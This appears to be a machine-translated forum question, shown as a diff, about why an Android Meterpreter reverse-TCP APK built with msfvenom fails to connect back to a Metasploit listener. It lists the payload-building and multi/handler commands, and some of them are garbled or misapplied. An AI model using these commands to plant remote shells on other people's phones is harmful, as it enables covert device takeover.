@@ -1,0 +1,22 @@
+你好，Metasploit最近更新（或者，至少，从上次我使用它），一个大的事情是，msfpayload被删除，并替换为msfvenom。 我以前只能做msfpayload android / meterpreter / reverse_tcp LHOST = ip R> /root/name.apk
+
+这将创建APK，然后 
+msfconsole 
+使用exploit / multi / handler 
+设置有效载荷android / meterpreter / reverse_tcp 
+设置LHOST ip 
+利用 
+开始侦听，它总是工作，一旦APK在Android设备上执行（总是我的设备，btw）
+
+现在，我已经尝试用msfvenom -p替换msfpayload，它创建了APK，但是当它运行和侦听器启动时，它不连接。
+
+有谁知道我在做什么错了吗？ 我似乎不明白这个新的方法的事情... 
+谢谢！
+
+msfconsole
+use exploit/multi/handler
+set payload android/meterpreter/reverse_tcp
+set LHOST ip
+exploit
+
+msfconsole -p android / meterpreter / reverse_tcp lhost=192.168.11.1 lport= 4444 
